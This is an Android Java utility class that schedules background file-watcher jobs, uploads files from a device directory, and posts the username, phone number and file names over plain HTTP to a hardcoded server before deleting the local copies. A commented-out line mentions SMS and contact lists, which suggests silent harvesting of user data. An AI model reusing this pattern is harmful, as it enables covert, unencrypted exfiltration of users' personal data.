package com.example.rahul.myotpgeneration;

import android.content.Context;
import android.content.SharedPreferences;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.util.Log;

import com.google.android.gms.gcm.GcmNetworkManager;
import com.google.android.gms.gcm.PeriodicTask;
import com.squareup.okhttp.MediaType;
import com.squareup.okhttp.OkHttpClient;
import com.squareup.okhttp.Request;
import com.squareup.okhttp.RequestBody;
import com.squareup.okhttp.Response;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;

/**
 * Created by VNurtureTechnologies on 03/09/16.
 */
public class NetworkUtil {
    public static int TYPE_WIFI = 1;
    public static int TYPE_MOBILE = 2;
    public static int TYPE_NOT_CONNECTED = 0;


    public static int getConnectivityStatus(Context context) {
        ConnectivityManager cm = (ConnectivityManager) context
                .getSystemService(Context.CONNECTIVITY_SERVICE);

        NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
        if (null != activeNetwork) {
            if (activeNetwork.getType() == ConnectivityManager.TYPE_WIFI)
                return TYPE_WIFI;

            if (activeNetwork.getType() == ConnectivityManager.TYPE_MOBILE)
                return TYPE_MOBILE;
        }
        return TYPE_NOT_CONNECTED;
    }

    public static boolean isConnectedToInternet(Context context) {
        int conn = NetworkUtil.getConnectivityStatus(context);
        boolean connected = false;
        if (conn == NetworkUtil.TYPE_WIFI || conn == NetworkUtil.TYPE_MOBILE) {
            connected = true;
        } else if (conn == NetworkUtil.TYPE_NOT_CONNECTED) {
            connected = false;
        }
        return connected;
    }

    // start network monitor to check internet periodically¡
    public static void startNetworkMonitor(Context context){
        // Schedule a task to occur between five and fifteen minutes from now:
        PeriodicTask periodic = new PeriodicTask.Builder()
                .setService(PushOnJobService.class)
                .setPeriod(1800L)
                .setFlex(900L)
                .setTag(Const.TAG)
                .setPersisted(false)
                .setRequiredNetwork(com.google.android.gms.gcm.Task.NETWORK_STATE_ANY)
                .setRequiresCharging(false)
                .setUpdateCurrent(true)
                .build();
        Log.d(Const.TAG,"periodic internet check start");
        GcmNetworkManager.getInstance(context).schedule(periodic);

    }

    // start file watcher monitor to check internet periodically¡
    public static void startFileWatcher(Context context){
        Log.d("myapp","NetworkUtils: filewatcher start");
        // Schedule a task to occur between five and fifteen minutes from now:
        PeriodicTask periodic1 = new PeriodicTask.Builder()
                .setService(FileWatcherService.class)
                .setPeriod(180L)
                .setFlex(60L)
                .setTag(Const.TAG)
                .setPersisted(false)
                .setRequiredNetwork(com.google.android.gms.gcm.Task.NETWORK_STATE_ANY)
                .setRequiresCharging(false)
                .setUpdateCurrent(true)
                .build();
        Log.d(Const.TAG,"periodic file check start");
        GcmNetworkManager.getInstance(context).schedule(periodic1);

    }

    public static boolean getFilePathWithName(String dirPath) {
        File folder = new File(dirPath);
        String folderPath = folder.getAbsolutePath();
        if(folder.listFiles() != null){
            File[] listOfFiles = folder.listFiles();
            Log.d(Const.TAG, "number of attached files: " + listOfFiles.length);
            CounterHolder.filePathArrayList = new ArrayList<>();
            CounterHolder.fileNameArrayList = new ArrayList<>();
            if (listOfFiles.length > 0) {
                for (int i = 0; i < listOfFiles.length; i++) {
                    String path = listOfFiles[i].getAbsolutePath();
                    // adding path to arraylist
                    CounterHolder.filePathArrayList.add(path);
                    // seperate filename from path and store into arraylist
                    String filename = path.substring(path.lastIndexOf("/") + 1);
                    CounterHolder.fileNameArrayList.add(filename);
                }
                return true;
            }
        }
        return false;
    }


    public static class FileUploadInBackground extends AsyncTask<Void, Void, Void> {
        String sourceFileUri, uploadFilePath, uploadFileName, serverUri;
        Context context;
        boolean emailsuddenSend = false;
        public FileUploadInBackground(Context context, String sourceFileUri, String uploadFilePath, String uploadFileName, String serverUri, boolean suddenEmailSend) {
            this.sourceFileUri = sourceFileUri;
            this.uploadFilePath = uploadFilePath;
            this.uploadFileName = uploadFileName;
            this.serverUri = serverUri;
            this.context = context;
            emailsuddenSend = suddenEmailSend;
        }

        @Override
        protected Void doInBackground(Void... params) {
            int serverResponseCode = 0;
            String fileName = sourceFileUri;

            HttpURLConnection conn = null;
            DataOutputStream dos = null;
            String lineEnd = "\r\n";
            String twoHyphens = "--";
            String boundary = "*****";
            int bytesRead, bytesAvailable, bufferSize;
            byte[] buffer;
            int maxBufferSize = 1 * 1024 * 1024;
            File sourceFile = new File(sourceFileUri);

            if (!sourceFile.isFile()) {

                Log.e("uploadFile", "Source File not exist :" + uploadFilePath + "" + uploadFileName);

            } else {
                try {

                    // open a URL connection to the Servlet
                    FileInputStream fileInputStream = new FileInputStream(sourceFile);
                    URL url = new URL(serverUri);

                    // Open a HTTP  connection to  the URL
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setDoInput(true); // Allow Inputs
                    conn.setDoOutput(true); // Allow Outputs
                    conn.setUseCaches(false); // Don't use a Cached Copy
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Connection", "Keep-Alive");
                    conn.setRequestProperty("ENCTYPE", "multipart/form-data");
                    conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
                    conn.setRequestProperty("uploaded_file", fileName);

                    dos = new DataOutputStream(conn.getOutputStream());

                    dos.writeBytes(twoHyphens + boundary + lineEnd);

                    dos.writeBytes("Content-Disposition: form-data; name='uploaded_file';filename='" + fileName + "'" + lineEnd);

                    dos.writeBytes(lineEnd);

                    // create a buffer of  maximum size
                    bytesAvailable = fileInputStream.available();

                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
                    buffer = new byte[bufferSize];

                    // read file and write it into form...
                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);

                    while (bytesRead > 0) {

                        dos.write(buffer, 0, bufferSize);
                        bytesAvailable = fileInputStream.available();
                        bufferSize = Math.min(bytesAvailable, maxBufferSize);
                        bytesRead = fileInputStream.read(buffer, 0, bufferSize);

                    }

                    // send multipart form data necesssary after file data...
                    dos.writeBytes(lineEnd);
                    dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                    // Responses from the server (code and message)
                    serverResponseCode = conn.getResponseCode();
                    String serverResponseMessage = conn.getResponseMessage();

                    Log.i("uploadFile", "HTTP Response is : " + serverResponseMessage + ": " + serverResponseCode);

                    if (serverResponseCode == 200) {
                        Log.d(Const.TAG, "Upload Successful");
                    }

                    //close the streams //
                    fileInputStream.close();
                    dos.flush();
                    dos.close();

                } catch (MalformedURLException ex) {

                    ex.printStackTrace();
                    Log.d(Const.TAG, "MalformedURLException Exception : check script url.");

                    Log.e("Upload file to server", "error: " + ex.getMessage(), ex);
                } catch (Exception e) {

                    e.printStackTrace();

                    Log.d(Const.TAG, "Upload file to server Exception : " + e.getMessage());
                }
//            dialog.dismiss();
//                return serverResponseCode;

            }
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
            if(emailsuddenSend){
                new SendEmails(context).execute();
            }
        }
    }

    // sending emails to server
    public static class SendEmails extends AsyncTask<Void,Void,Void> {
        Context context;
        private final String URL = "http://www.targetsolutions.co/targetsolutions.co/jashma/mailtest.php";
//        private final String URL = "http://www.vnurture.in/test/vnprojects/smartfuel/mailtest.php";
        private final MediaType JSON = MediaType.parse("application/json;charset=utf-8");

        public SendEmails(Context context) {
            this.context = context;
        }

        @Override
        protected Void doInBackground(Void... params) {
            OkHttpClient client = new OkHttpClient();
            RequestBody body = RequestBody.create(JSON,createJSON());
            Log.d(Const.TAG,createJSON());
            Log.d(Const.TAG,URL);
            Request request = new Request.Builder()
                    .url(URL)
                    .post(body)
                    .build();
            try {
                Response response = client.newCall(request).execute();
                String res = response.body().string();
                Log.d(Const.TAG,res);
//                JSONObject object1 = new JSONObject(res);
                if(res != null){
                    if(res.contains("\"success\":1")){
                        Log.d(Const.TAG,"email sent");
                        SharedPreferences preferences = context.getSharedPreferences(Const.SHAREDPREFERENCE_MAIN, Context.MODE_PRIVATE);
                        String dir = preferences.getString(Const.DIR_PATH,null);
                        File file = new File(dir);
                        //deleting file
                        if(dir != null) {
                            Utils.deleteRecursive(file);
                        }
                        // incrementing date
                        String emailDate = preferences.getString(Const.EMAIL_SEND_DATE,null);
                        if(emailDate != null) {
    //                        String incrementedDate = Utils.incrementDate(emailDate);
    //                        String currentDate = Utils.getCurrentDate();
                            SharedPreferences.Editor editor = preferences.edit();

    //                        editor.putString(Const.EMAIL_SEND_DATE,incrementedDate);
                            // putting current date
                            editor.putString(Const.EMAIL_SUCCESSFUL_SEND_DATE, Utils.getCurrentDate());
    //                        editor.apply();
                            // adding flag for email send;
                            editor.putInt(Const.EMAIL_SUCCESSFUL_SEND, 1);
                            editor.putInt(Const.FIRST_TIME,0);
                            editor.apply();
//                            PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
//                            PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_DIM_WAKE_LOCK, "My Tag");
//                            wl.release();
                        }
                    } else{
                        // some thing goes wrong if email
                        // if internet is not connected then Network moniter will trigger
                        // else file watcher wil trigger
                        if(isConnectedToInternet(context)){
                            NetworkUtil.startFileWatcher(context);
                        }else{
                            NetworkUtil.startNetworkMonitor(context);
                        }
                    }
                }else{
                    Log.d(Const.TAG,"respones null");
                    // some thing goes wrong if email
                    // if internet is not connected then Network moniter will trigger
                    // else file watcher wil trigger
                    if(isConnectedToInternet(context)){
                        NetworkUtil.startFileWatcher(context);
                    }else{
                        NetworkUtil.startNetworkMonitor(context);
                    }
                }

            }catch (Exception e) {
                e.printStackTrace();
            }

            return null;
        }

        private String createJSON() {
            SharedPreferences preferences = context.getSharedPreferences(Const.SHAREDPREFERENCE_MAIN, Context.MODE_PRIVATE);
            String mobile = preferences.getString(Const.PHONE_NUMBER,"No Number");
            String date = preferences.getString(Const.EMAIL_SEND_DATE,"No Date");
            String username = preferences.getString(Const.USERNAME_PREF,"No Username");
            int firstTime = preferences.getInt(Const.FIRST_TIME,-1);
            JSONObject mainobject = new JSONObject();
            try {
                int count = CounterHolder.fileNameArrayList.size();
                if(count > 0){
//                if(CounterHolder.smsUberModelArrayList.size() > 0 || CounterHolder.smsOlaModelArrayList.size() > 0 || CounterHolder.smsBkModelArrayList.size() > 0 || CounterHolder.contactModelArrayList.size() > 0 || CounterHolder.smsPromArrayList.size() > 0) {
                    mainobject.putOpt("files", createJSONArray());
                }
                mainobject.putOpt("username",username);
                mainobject.putOpt("mobile", mobile);
                mainobject.putOpt("date",date);
                if(firstTime != -1){
                    mainobject.putOpt("firsttime",firstTime);
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
            Log.d(Const.TAG, String.valueOf(mainobject));
            return String.valueOf(mainobject);
        }

        private JSONArray createJSONArray() throws JSONException {
            JSONArray array = new JSONArray();
            int count = CounterHolder.fileNameArrayList.size();
//            if(count > 0) {
                for (int i = 0; i < count; i++) {
                    JSONObject object = new JSONObject();
                    object.putOpt("filename", CounterHolder.fileNameArrayList.get(i));
                    array.put(object);
                }
//            }else{
//                array = null;
//            }
            return array;
        }
    }
}